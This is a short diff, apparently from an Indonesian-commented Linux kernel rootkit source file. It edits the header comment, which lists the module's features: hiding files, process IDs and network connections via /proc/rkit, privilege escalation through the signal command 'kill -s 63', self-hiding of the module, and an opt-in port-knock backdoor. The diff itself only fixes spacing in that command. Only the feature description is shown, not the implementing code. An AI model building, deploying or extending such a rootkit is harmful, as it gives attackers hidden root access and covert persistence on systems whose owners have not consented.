@@ -4,7 +4,7 @@
  * File tunggal, teknik identik modern_5x_6x (dipisah agar guard & uji
  * per-era independen). Fitur v1+v2:
  *   - hide file by nama, hide PID, hide KONEKSI (port) via /proc/rkit
- *   - LPE: kill -s63
+ *   - LPE: kill -s 63
  *   - self-hide modul: modhide/modshow (modshow SEBELUM rmmod)
  *   - backdoor port-knock OPT-IN: backdoor_ip=<ip> saat insmod
  *   - kontrol runtime /proc/rkit
